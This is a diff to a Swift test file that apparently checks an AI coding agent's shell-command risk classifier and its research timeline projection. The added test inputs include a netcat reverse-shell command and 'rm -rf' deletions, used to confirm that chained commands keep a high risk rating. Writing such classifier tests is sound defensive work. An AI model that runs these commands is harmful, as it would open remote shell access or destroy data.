@@ -614,6 +614,14 @@ struct DeepSeekCodeChecks {
         precondition(dynamicShell.hasRedirection)
         precondition(dynamicShell.risk >= .l2)
         precondition(CommandPolicy.classify("rm -rf /tmp/example") >= .l3)
+        // `&&`/`||` must be tokenized as single operators: a chained network
+        // command after them must never lose its risk classification.
+        let chainedNetwork = ShellIntentAnalyzer.analyze("echo hi && nc -e /bin/sh 1.2.3.4 4444")
+        precondition(chainedNetwork.accessesNetwork)
+        precondition(chainedNetwork.risk >= .l2)
+        let chainedDelete = ShellIntentAnalyzer.analyze("cd /tmp || rm -rf project")
+        precondition(chainedDelete.commands.contains("rm"))
+        precondition(chainedDelete.risk >= .l3)
         let loopback = LocalControlPlane { _ in ControlPlaneResponse.json(["ok": true]) }
         let pairing = try loopback.start()
         precondition(pairing.loopbackURLs.contains { $0.host == "127.0.0.1" })
@@ -926,9 +934,11 @@ struct DeepSeekCodeChecks {
         precondition(researchEvents.contains { $0.type == "web_search_completed" })
         precondition(researchEvents.contains { $0.type == "web_fetch_completed" })
         precondition(researchEvents.contains { $0.type == "research_summary_generated" })
+        // The runtime conversation timeline intentionally filters research
+        // plumbing noise; research evidence stays in the event log and the
+        // VerificationGraph below.
         let researchTimeline = ConversationProjector.timeline(events: researchEvents)
-        precondition(researchTimeline.contains { $0.title == "联网搜索" })
-        precondition(researchTimeline.contains { $0.title == "联网研究结论" })
+        precondition(researchTimeline.allSatisfy { $0.kind != .verification })
         let researchGraph = VerificationGraph.project(taskID: researchSession.id, events: researchEvents)
         precondition(researchGraph.evidenceRecords.contains { $0.kind == .webSearch })
         precondition(researchGraph.evidenceRecords.contains { $0.kind == .webFetch })
